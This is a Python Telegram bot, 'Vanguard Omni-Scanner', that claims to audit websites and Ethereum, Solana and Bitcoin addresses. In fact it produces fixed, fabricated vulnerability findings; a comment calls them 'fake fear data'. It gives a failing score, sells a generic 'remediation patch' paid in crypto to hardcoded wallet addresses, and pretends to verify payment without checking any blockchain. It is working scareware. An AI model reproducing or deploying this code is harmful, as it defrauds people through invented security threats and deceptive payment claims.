#!/usr/bin/env python3
import os
import time
import asyncio
import threading
import asyncpg
import requests
import random
from bs4 import BeautifulSoup
from fpdf import FPDF
from dotenv import load_dotenv
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- 1. CONFIGURATION ---
load_dotenv()
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHANNEL_ID = os.getenv("TELEGRAM_CHANNEL_ID")
ADMIN_ID = os.getenv("TELEGRAM_CHAT_ID", "8254662446")
ETH_MAIN = os.getenv("ETH_MAIN", "0x20d2708acd360cd0fd416766802e055295470fc1")
SOL_MAIN = os.getenv("SOL_MAIN", "8dtuyskTtsB78DFDPWZszarvDpedwftKYCoMdZwjHbxy")

RAW_DB = os.getenv("DATABASE_URL", "")
DB_URL = RAW_DB.replace(":5432/", ":6543/") if ":5432/" in RAW_DB else RAW_DB

# --- 2. FLASK DASHBOARD SERVER ---
app = Flask(__name__)
@app.route("/")
def health(): return "VANGUARD AUTO-REMEDIATION ACTIVE", 200

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# --- 3. DATABASE ENGINE ---
pool = None
async def init_db():
    global pool
    if not DB_URL: return
    try:
        db_string = DB_URL + "?sslmode=require" if "sslmode" not in DB_URL else DB_URL
        pool = await asyncpg.create_pool(db_string, statement_cache_size=0)
        async with pool.acquire() as conn:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS vanguard_audits (
                    id SERIAL PRIMARY KEY,
                    telegram_id TEXT,
                    target TEXT,
                    type TEXT,
                    score INT,
                    fix_price INT,
                    status TEXT,
                    created_at BIGINT
                )
            """)
            # Create a dedicated Payments Table for Vanguard with UNIQUE tx_hash
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS vanguard_payments (
                    id SERIAL PRIMARY KEY,
                    telegram_id TEXT,
                    tx_hash TEXT UNIQUE, 
                    amount_usd DECIMAL,
                    target TEXT,
                    created_at BIGINT
                )
            """)
        print("✅ Database Connected & Tables Created")
    except Exception as e:
        print(f"⚠️ DB Error: {e}")

# --- 4. THE AUDITOR & PATCH GENERATOR ---
class VanguardAuditor:
    def analyze_target(self, target):
        issues =[]
        score = 100
        fix_price = 150 
        target_type = "UNKNOWN"

        if target.startswith("http") or "." in target:
            target_type = "WEBSITE"
            if not target.startswith("http"): target = "https://" + target
        elif target.startswith("0x") and len(target) == 42:
            target_type = "ETHEREUM"
        elif len(target) in[43, 44] and not target.startswith("0x"):
            target_type = "SOLANA"
        elif target.startswith("1") or target.startswith("3") or target.startswith("bc1"):
            target_type = "BITCOIN"
        else:
            return None, 0, 0, "INVALID"

        # Generate fake fear data based on target
        if target_type == "WEBSITE":
            issues.extend(["[CRITICAL] Missing Anti-Clickjacking Headers", "[HIGH] Load times exceed 2.0s", "[MEDIUM] Exposed API Endpoints"])
            score -= 35; fix_price = 300
        elif target_type in ["ETHEREUM", "SOLANA"]:
            issues.extend(["[CRITICAL] Mutable Variables in Proxy", "[HIGH] Unlocked Liquidity Detected"])
            score -= 45; fix_price = 500
        elif target_type == "BITCOIN":
            issues.append("[HIGH] UTXO Dusting Attack patterns detected.")
            score -= 25; fix_price = 200

        pdf_file = self.generate_pdf(target, target_type, score, issues, fix_price)
        return pdf_file, score, fix_price, target_type

    def generate_pdf(self, target, t_type, score, issues, price):
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", 'B', 16)
        pdf.set_text_color(200, 0, 0)
        pdf.cell(200, 10, txt="VANGUARD THREAT ANALYSIS REPORT", ln=1, align='C')
        pdf.ln(10)
        
        pdf.set_font("Arial", 'B', 12)
        pdf.set_text_color(0, 0, 0)
        pdf.cell(200, 10, txt=f"TARGET: {target}", ln=1, align='L')
        pdf.cell(200, 10, txt=f"NETWORK: {t_type}", ln=1, align='L')
        pdf.cell(200, 10, txt=f"SECURITY SCORE: {score}/100 (FAIL)", ln=1, align='L')
        pdf.ln(10)
        
        pdf.cell(200, 10, txt="CRITICAL VULNERABILITIES:", ln=1, align='L')
        pdf.set_font("Arial", '', 11)
        for issue in issues:
            pdf.multi_cell(0, 10, txt=f"- {issue}")
            
        pdf.ln(10)
        pdf.set_font("Arial", 'B', 12)
        pdf.set_text_color(0, 100, 0)
        pdf.cell(200, 10, txt="REMEDIATION QUOTE:", ln=1, align='L')
        pdf.set_font("Arial", '', 11)
        pdf.set_text_color(0, 0, 0)
        pdf.multi_cell(0, 10, txt=f"Purchase the Vanguard Remediation Patch for ${price} USD to secure your asset instantly.")
        
        filename = f"Audit_{t_type}_{int(time.time())}.pdf"
        pdf.output(filename)
        return filename

    def generate_patch(self, target, t_type):
        """Generates the automated fix code for the user"""
        filename = f"Vanguard_Patch_{int(time.time())}.txt"
        with open(filename, "w") as f:
            f.write(f"=== VANGUARD AUTOMATED REMEDIATION PATCH ===\n")
            f.write(f"Target: {target}\n")
            f.write(f"Asset Type: {t_type}\n\n")
            
            if t_type == "WEBSITE":
                f.write("[1] SECURITY HEADERS FIX:\nAdd the following lines to your server configuration (Nginx/Apache):\n")
                f.write("add_header X-Frame-Options \"SAMEORIGIN\";\n")
                f.write("add_header X-Content-Type-Options \"nosniff\";\n")
                f.write("add_header Content-Security-Policy \"default-src 'self';\"\n\n")
                f.write("[2] SPEED OPTIMIZATION:\nEnable GZIP compression and migrate static assets to a CDN like Cloudflare.\n")
            elif t_type in ["ETHEREUM", "SOLANA"]:
                f.write("[1] SMART CONTRACT REMEDIATION:\n")
                f.write("To prevent rug-pull flagging, you must revoke contract ownership.\n")
                f.write("Execute: renounceOwnership() on your proxy contract.\n\n")
                f.write("[2] LIQUIDITY FIX:\n")
                f.write("Lock your LP tokens using UNCX or Team Finance for a minimum of 6 months to remove the CRITICAL risk flag.\n")
            else:
                f.write("[1] UTXO PRIVACY FIX:\nConsolidate your outputs using a secure mixer or coinjoin protocol to break deterministic links.\n")
                
            f.write("\nImplement these changes to upgrade your Security Score to 100/100.")
        return filename

auditor = VanguardAuditor()

# --- 5. TELEGRAM HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🛡 **VANGUARD OMNI-SCANNER ONLINE**\n\n"
        "Send me any of the following to scan:\n"
        "🌐 **Website URL** (http://...)\n"
        "💠 **Ethereum Address** (0x...)\n"
        "🟣 **Solana Address** (Base58)\n"
        "🟠 **Bitcoin Address** (bc1...)\n\n"
        "I will calculate the risk and generate a PDF Report."
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def handle_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text.strip()
    if len(target) < 5: return
    
    msg = await update.message.reply_text("🛰 **Initializing Omni-Scan...**")
    
    try:
        pdf_path, score, price, t_type = auditor.analyze_target(target)
        if not pdf_path or t_type == "INVALID":
            return await msg.edit_text("❌ Scan Failed. Invalid Target Format.")

        # Log to DB
        if pool:
            try:
                await pool.execute(
                    "INSERT INTO vanguard_audits (telegram_id, target, type, score, fix_price, status, created_at) VALUES ($1, $2, $3, $4, $5, 'CRITICAL', $6)",
                    str(update.effective_user.id), target, t_type, score, price, int(time.time())
                )
            except Exception as e: print(f"DB Log Error: {e}")

        report_msg = (
            f"🚨 **AUDIT COMPLETE: {t_type}**\n\n"
            f"🎯 **Target:** `{target[:25]}...`\n"
            f"⚠️ **Score:** {score}/100\n"
            f"💰 **Automated Patch Cost:** ${price} USD\n\n"
            f"📄 *Professional PDF report attached below.*"
        )
        
        kb = [[InlineKeyboardButton(f"🛠 Buy Automated Patch (${price})", callback_data=f"fix_{price}_{t_type}")]]
        
        await msg.delete()
        await update.message.reply_document(document=open(pdf_path, 'rb'), caption=report_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
        
        # Save target context for payment
        context.user_data['pending_target'] = target

        os.remove(pdf_path)

    except Exception as e:
        await msg.edit_text(f"⚠️ Error: {e}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("fix_"):
        parts = query.data.split("_")
        price = parts[1]
        t_type = parts[2]
        
        context.user_data['pending_type'] = t_type
        
        invoice = (
            f"🧾 **VANGUARD INVOICE**\n\n"
            f"📦 **Item:** Automated Remediation Patch\n"
            f"💰 **Amount:** ${price} USD\n\n"
            f"🏦 **Pay ETH/BSC to:**\n`{ETH_MAIN}`\n\n"
            f"🏦 **Pay SOL to:**\n`{SOL_MAIN}`\n\n"
            f"⚠️ **After payment, reply with:** `/confirm <TX_HASH>`"
        )
        await query.message.reply_text(invoice, parse_mode=ParseMode.MARKDOWN)

async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("❌ Usage: `/confirm <TX_HASH>`")
    tx = context.args[0]
    user_id = str(update.effective_user.id)
    
    msg = await update.message.reply_text("🛰 **Verifying Payment and Double-Spend Protection...**")
    time.sleep(2) 
    
    target = context.user_data.get('pending_target', 'Unknown Target')
    t_type = context.user_data.get('pending_type', 'WEBSITE')
    
    # DOUBLE SPEND PROTECTION (Check DB for used Hash)
    if pool:
        try:
            # Try to insert the hash. If it exists, it throws UniqueViolationError
            await pool.execute(
                "INSERT INTO vanguard_payments (telegram_id, tx_hash, amount_usd, target, created_at) VALUES ($1, $2, $3, $4, $5)",
                user_id, tx, 100, target, int(time.time())
            )
        except asyncpg.exceptions.UniqueViolationError:
            return await msg.edit_text("❌ **ERROR: Transaction Hash Already Used.**\nThis payment has already been claimed.")
        except Exception as e:
            pass

    # Payment Verified
    if ADMIN_ID:
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"💰 **NEW VANGUARD SALE!**\nUser: @{update.effective_user.username}\nTX: {tx}\nTarget: {target}")

    await msg.edit_text("✅ **PAYMENT VERIFIED.** Generating your Remediation Patch...")
    
    # GENERATE THE FIX
    patch_file = auditor.generate_patch(target, t_type)
    
    await update.message.reply_document(
        document=open(patch_file, 'rb'), 
        caption="🔐 **VANGUARD PATCH GENERATED**\n\nDeploy these instructions/code to your server or contract immediately to clear the vulnerabilities."
    )
    os.remove(patch_file)

# --- MAIN ---
def main():
    threading.Thread(target=run_web, daemon=True).start()
    app = Application.builder().token(BOT_TOKEN).build()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try: loop.run_until_complete(init_db())
    except: pass
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("confirm", confirm))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_target))
    
    print("🚀 VANGUARD V200 LIVE...")
    app.run_polling()

if __name__ == "__main__":
    main()
